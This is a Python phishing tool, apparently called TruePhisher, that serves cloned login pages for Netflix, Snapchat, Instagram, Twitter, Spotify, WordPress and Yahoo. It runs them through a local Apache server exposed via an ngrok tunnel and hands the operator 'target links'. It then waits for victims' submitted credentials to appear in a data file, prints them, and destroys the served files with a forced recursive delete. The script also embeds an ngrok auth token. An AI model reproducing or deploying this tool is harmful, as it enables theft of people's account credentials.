# This Program as Coded By Dm_Hack3ng

import subprocess
import os
import re 
import sys
import time 
import sys
from termcolor import colored

ngrok_path="/usr/bin/ngrok"
log_name="log_file.txt"
ngrok_token="/root/.ngrok2/ngrok.yml"
DEVNULL=open(os.devnull,"wb")


def banner():
	print(colored("\n\t<<= ************** Website ************* =>>\n", 'cyan',attrs=['bold']))
	print(colored("\t[1] Netflix  [2] Snapchat [3] Instagram\n", 'green',attrs=['bold']))
	print(colored("\t[4] Twitter  [5] Spotify  [6] Wordpress\n", 'green',attrs=['bold']))
	print(colored("\t[7] Yahoo\n", 'green',attrs=['bold']))
	
	
def find_url():
	subprocess.Popen("sudo ngrok http 80 --log log_file.txt ",shell=True,stdout=DEVNULL,stdin=DEVNULL,stderr=DEVNULL)
	time.sleep(6)	
	with open("log_file.txt",'r') as zeu:
		while True:
			time.sleep(10)
			data=zeu.read()
			my_url=re.findall("https://.*.ngrok.io",data)			
			return my_url[0]
def check_data():
	os.chdir("/var/www/html/")
	with open("donnees.txt",'r') as yo:
		while True:
			time.sleep(2)		
			return yo.read()

def cleaner():
	subprocess.Popen("sudo service apache2 stop",shell=True)
	os.chdir("/var/www/html/")	
	subprocess.call("sudo rm -fr * ",shell=True)
	subprocess.call("sudo killall ngrok",shell=True,stdout=DEVNULL,stdin=DEVNULL,stderr=DEVNULL)
	os.chdir("/home/kali/TruePhisher/")
	if os.path.exists(log_name):
		os.remove(log_name)
	
	print(colored('All So Good :)', 'green',attrs=['bold']))
	print(colored('Good Bye :)', 'red',attrs=['bold']))
	
def use_ngrok():
	os.chdir("/home/kali/TruePhisher/")
	if not os.path.exists(ngrok_path): 
		subprocess.call("sudo cp -fr ngrok /usr/bin/",shell=True)
	if not ngrok_token:
			subprocess.call("sudo ngrok authtoken 71CEtYnXyaa1k9QVqPBsp_2RRCSXKXtR7V5oSK4qQUK",shell=True)
	result=find_url()
	print("[+] Your Target Links ==> "+str(result)+"\n")
	show_verdict()

def show_verdict():
	while True:
		final_data=check_data()		
		if final_data:
			print(colored('\r\n[+] Data Found [+]\n', 'red',attrs=['bold']))
			print("\r==> "+final_data+" <==\n")
			print(colored('[++] Running Cleaner [++]\n', 'green',attrs=['bold'])
)
			cleaner()
			exit()
		else:
			print('\r[+] Waiting Target',end="")
			
	
def background_run(wb_name):
	subprocess.call("sudo cp -fr website/"+wb_name+"/* /var/www/html/",shell=True)
	os.chdir("/var/www/html/")	
	subprocess.call("sudo chmod 777 * ",shell=True)	
	subprocess.call("sudo service apache2 start",shell=True)
	response=input("[+] Utilisez Ngrok >> ")
	if response=="oui":
		use_ngrok()
	else:
		print("Your Final Links ==> http://127.0.0.1\n")
		show_verdict()	

def choice():
	banner()
	target=input("[+] Choississez votre cible >> ")
	if target=="1":
		background_run("netflix")
	elif target=="2":
		background_run("snapchat")
	elif target=="3":
		background_run("instagram")
	elif target=="4":
		background_run("twitter")
	elif target=="5":
		background_run("spotify")
	elif target=="6":
		background_run("wordpress")
	elif target=="7":
		background_run("yahoo")

choice()
